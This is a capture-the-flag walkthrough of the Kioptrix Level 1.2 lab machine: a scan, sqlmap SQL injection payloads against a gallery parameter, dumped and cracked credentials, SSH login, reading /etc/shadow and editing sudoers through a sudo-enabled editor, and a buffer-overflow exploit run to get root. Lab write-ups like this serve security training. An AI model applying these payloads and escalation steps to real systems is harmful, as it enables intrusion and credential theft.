# Kioptrix Level 1.2 | VulnHub
https://www.vulnhub.com/entry/kioptrix-level-12-3,24/

### 1. Scan
```bash
kali@kali:~$ nmap -A -T4 -p- kioptrix3.com
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-28 02:47 EDT
Nmap scan report for kioptrix3.com (10.1.1.7)
Host is up (0.0030s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
|_http-title: Ligoat Security - Got Goat? Security ...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.37 seconds
```
The machine is running SSH and Apache.

### 2. Check out the web server
The website is fairly simple with a few pages - a blog, photo gallery and a login form. The gallery CMS is apparently custom. Starting out there, it is clear the gallery is based on a database backend, and images can be sorted by various columns in those tables. Firstly identify an injectable parameter:
```bash
kali@kali:~/Desktop$ sqlmap -r gallery.request 
        ___
       __H__                                                                                                                                                                                        
 ___ ___[)]_____ ___ ___  {1.4.8#stable}                                                            
|_ -| . [.]     | .'| . |
|___|_  [']_|_|_|__,|  _|                                 
      |_|V...       |_|   http://sqlmap.org                                                                                                                                                         

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 02:59:10 /2020-10-28/

[02:59:10] [INFO] parsing HTTP request from 'gallery.request'
[02:59:10] [INFO] testing connection to the target URL
[02:59:11] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
[02:59:11] [INFO] checking if the target is protected by some kind of WAF/IPS
[02:59:11] [INFO] testing if the target URL content is stable
[02:59:11] [INFO] target URL content is stable
[02:59:11] [INFO] testing if GET parameter 'id' is dynamic
[02:59:11] [INFO] GET parameter 'id' appears to be dynamic
[02:59:11] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[02:59:11] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[02:59:11] [INFO] testing for SQL injection on GET parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[02:59:40] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[02:59:40] [WARNING] reflective value(s) found and filtering out
[02:59:40] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[02:59:41] [INFO] GET parameter 'id' appears to be 'Boolean-based blind - Parameter replace (original value)' injectable (with --code=500)
[02:59:41] [INFO] testing 'Generic inline queries'
[02:59:41] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[02:59:41] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[02:59:41] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[02:59:41] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[02:59:41] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[02:59:41] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[02:59:41] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[02:59:41] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[02:59:41] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[02:59:41] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[02:59:41] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[02:59:41] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[02:59:41] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[02:59:41] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[02:59:41] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[02:59:41] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[02:59:41] [INFO] GET parameter 'id' is 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)' injectable 
[02:59:41] [INFO] testing 'MySQL inline queries'
[02:59:41] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[02:59:41] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[02:59:41] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[02:59:41] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[02:59:41] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[02:59:41] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[02:59:41] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[02:59:52] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[02:59:52] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[02:59:52] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[02:59:52] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[02:59:52] [INFO] target URL appears to have 6 columns in query
[02:59:52] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 49 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: id=(SELECT (CASE WHEN (7374=7374) THEN 1 ELSE (SELECT 8244 UNION SELECT 4159) END))&sort=photoid

    Type: error-based
    Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
    Payload: id=1 OR ROW(2109,2434)>(SELECT COUNT(*),CONCAT(0x7170717871,(SELECT (ELT(2109=2109,1))),0x717a6b7171,FLOOR(RAND(0)*2))x FROM (SELECT 2212 UNION SELECT 5634 UNION SELECT 1480 UNION SELECT 9609)a GROUP BY x)&sort=photoid

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 5080 FROM (SELECT(SLEEP(5)))QsQi)&sort=photoid

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: id=1 UNION ALL SELECT NULL,CONCAT(0x7170717871,0x664a707568684747494d4764767967637763556c726a6c4a6b4e71574a4668795856417a65585862,0x717a6b7171),NULL,NULL,NULL,NULL-- -&sort=photoid
---
[02:59:57] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 4.1
[02:59:57] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 21 times
[02:59:57] [INFO] fetched data logged to text files under '/home/kali/.sqlmap/output/kioptrix3.com'

[*] ending @ 02:59:57 /2020-10-28/

```
With an injectable parameter, I can then dump out all database information with `--dump-all`. This includes the gallery database.
Among the dumped database tables is a dev_accounts table with two users and hashed passwords.
```bash
kali@kali:~/Desktop/osc/kiol3/gallery$ cat dev_accounts.csv 
id,password,username
1,0d3cfbec887aabd50f243b3f155c0f85,dreg
2,5badcaf789d3d1d09794d8f021f40f0e,loneferret
```
The first user hash doesn't crack, however the second hash cracks to a plaintext password of `starwars`.
Also there is another table called gallarific_users with a single row.
```bash
kali@kali:~/Desktop/osc/kiol3/gallery$ cat gallarific_users.csv 
userid,email,photo,website,joincode,lastname,password,username,usertype,firstname,datejoined,issuperuser
1,<blank>,<blank>,<blank>,<blank>,User,n0t7t1k4,admin,superuser,Super,1302628616,1
```
Together, these tables provide two sets of complete credentials:
- `loneferret:starwars`
- `admin:n0t7t1k4`
  
Unfortunately, none of these credentials work with the main login form available from the site page. However, if the gallery is running it's own CMS, then it would most likely have a seperate login page as well. By viewing the source code on a gallery page, a commented out link to kioptrix3.com/gallery/gadmin/ directs me to a second login form.

### 3. Get admin access to the gallery.
Though we have two accounts to try, it makes sense to start with the one which is designated as a superuser. This succeeds. Now we have access to the photo gallery administration pages, which allows a user to upload photos and organise galleries.

### 4. Get a shell
Additionally, I can take the other set of credentials for loneferret and use them to login to the machine over SSH.
```bash
kali@kali:~/Desktop/osc/kiol3/gallery$ ssh loneferret@kioptrix3.com
The authenticity of host 'kioptrix3.com (10.1.1.7)' can't be established.
RSA key fingerprint is SHA256:NdsBnvaQieyTUKFzPjRpTVK6jDGM/xWwUi46IR/h1jU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'kioptrix3.com,10.1.1.7' (RSA) to the list of known hosts.
loneferret@kioptrix3.com's password: 
Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
Last login: Sat Apr 16 08:51:58 2011 from 192.168.1.106
loneferret@Kioptrix3:~$ whoami
loneferret
````
I now have two forms of access on the machine, though a shell is way better.

### 5. Enumerate from user
There are two files in the user's home directory.
```bash
loneferret@Kioptrix3:~$ ls
checksec.sh  CompanyPolicy.README
loneferret@Kioptrix3:~$ cat CompanyPolicy.README 
Hello new employee,
It is company policy here to use our newly installed software for editing, creating and viewing files.
Please use the command 'sudo ht'.
Failure to do so will result in you immediate termination.

DG
CEO

loneferret@Kioptrix3:~$ cat checksec.sh 
#!/bin/bash
#
# The BSD License (http://www.opensource.org/licenses/bsd-license.php) 
# specifies the terms and conditions of use for checksec.sh:
#
# Copyright (c) 2009-2011, Tobias Klein.
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without 
# modification, are permitted provided that the following conditions 
# are met:
# 
# * Redistributions of source code must retain the above copyright 
#   notice, this list of conditions and the following disclaimer.
# * Redistributions in binary form must reproduce the above copyright 
#   notice, this list of conditions and the following disclaimer in 
#   the documentation and/or other materials provided with the 
#   distribution.
# * Neither the name of Tobias Klein nor the name of trapkit.de may be 
#   used to endorse or promote products derived from this software 
#   without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS 
# "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT 
# LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS 
# FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE 
# COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, 
# INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, 
# BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS 
# OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED 
# AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, 
# OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF 
# THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH 
# DAMAGE.
#
# Name    : checksec.sh
# Version : 1.4
# Author  : Tobias Klein
# Date    : January 2011
# Download: http://www.trapkit.de/tools/checksec.html
# Changes : http://www.trapkit.de/tools/checksec_changes.txt
#
# Description:
#
# Modern Linux distributions offer some mitigation techniques to make it 
# harder to exploit software vulnerabilities reliably. Mitigations such 
# as RELRO, NoExecute (NX), Stack Canaries, Address Space Layout 
# Randomization (ASLR) and Position Independent Executables (PIE) have 
# made reliably exploiting any vulnerabilities that do exist far more 
# challenging. The checksec.sh script is designed to test what *standard* 
# Linux OS and PaX (http://pax.grsecurity.net/) security features are being 
# used.
#
# As of version 1.3 the script also lists the status of various Linux kernel 
# protection mechanisms.
#
# Credits:
#
# Thanks to Brad Spengler (grsecurity.net) for the PaX support.
# Thanks to Jon Oberheide (jon.oberheide.org) for the kernel support.
# 
# Others that contributed to checksec.sh (in no particular order):
#
# Simon Ruderich, Denis Scherbakov, Stefan Kuttler, Radoslaw Madej,
# Anthony G. Basile. 
#

# global vars
have_readelf=1
verbose=false
```
Checking sudo permissions, the user does indeed have sudo access to Ht. Ht is a file/hex editor, and since we have root access to it with no password I can use it to modify files on the system as root.
```bash
loneferret@Kioptrix3:~$ sudo -l         
User loneferret may run the following commands on this host:
    (root) NOPASSWD: !/usr/bin/su
    (root) NOPASSWD: /usr/local/bin/ht
```
So one thing I can try is checking out the shadow file.
```bash
loneferret@Kioptrix3:~$ sudo ht /etc/shadow
Error opening terminal: xterm-256color.
loneferret@Kioptrix3:~$ export TERM=xterm  
loneferret@Kioptrix3:~$ sudo ht /etc/shadow
```
This opens the file, and I can get root's hash/salt:
```
root:$1$QAKvVJey$6rRkAMGKq1u62yfDaenUr1:15082:0:99999:7:::
```

### 6. Try to crack root hash
```bash
kali@kali:~/Desktop/osc/kiol3$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt root.hash 
[sudo] password for kali: 
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:02:59 DONE (2020-10-28 03:57) 0g/s 78766p/s 78766c/s 78766C/s  ejngyhga007..*7¡Vamos!
Session completed
kali@kali:~/Desktop/osc/kiol3$ sudo john --show root.hash 
0 password hashes cracked, 1 left
```
Unfortunately it doesn't crack with rockyou. I take this to mean it is a dead-end. Luckily the ability to edit any file on the system means there are plenty of other things to try.

### 7. Escalate to root
One thing that should definately work is editing the sudoer file to allow the user to switch to root.
```bash
loneferret@Kioptrix3:~$ sudo ht /etc/sudoers
```
I then modify the sudoers line for loneferret to read NOPASSWD:ALL.  
Note: Using Ht was a nightmare. The documentation online is very poor. By purely trial and error, I found the find/replace function mapped to Ctrl+E, and the Save function mapped to F10.
```bash
loneferret@Kioptrix3:~$ sudo ht /etc/sudoers
loneferret@Kioptrix3:~$ sudo -l
User loneferret may run the following commands on this host:
    (root) NOPASSWD: ALL
```
Then I can escalate my permissions to root.
```bash
loneferret@Kioptrix3:~$ sudo -s
root@Kioptrix3:~# whoami
root
```

## Alternate path
An alternate path to root exists at the user level thanks to the version of Ht which is vulnerable to a buffer overflow.
```bash
loneferret@Kioptrix3:~$ ht -v
ht 2.0.18 (POSIX) 07:26:02 on Apr 16 2011
(c) 1999-2004 Stefan Weyergraf
(c) 1999-2009 Sebastian Biallas <sb@biallas.net>
```
This version is vulnerable to a buffer overflow through an argument provided to the program which overwrites EIP. There was a public exploit - https://www.exploit-db.com/exploits/17083, but it was developed for a later version of Perl from the one which was available for this machine. In order to get it working for this situation I had to modify it (see htexploit.pl). This involved removing stuff specific to other operating systems, changing the functions that were used and modifying the path argument.
```bash
loneferret@Kioptrix3:~$ perl htexploit.pl 
[*]Looking for $esp and endwin()...[+]endwin() address found! (0x0804a3f8)[+]$esp place found! (0x0818138b)
root@Kioptrix3:/home/loneferret# whoami
root
```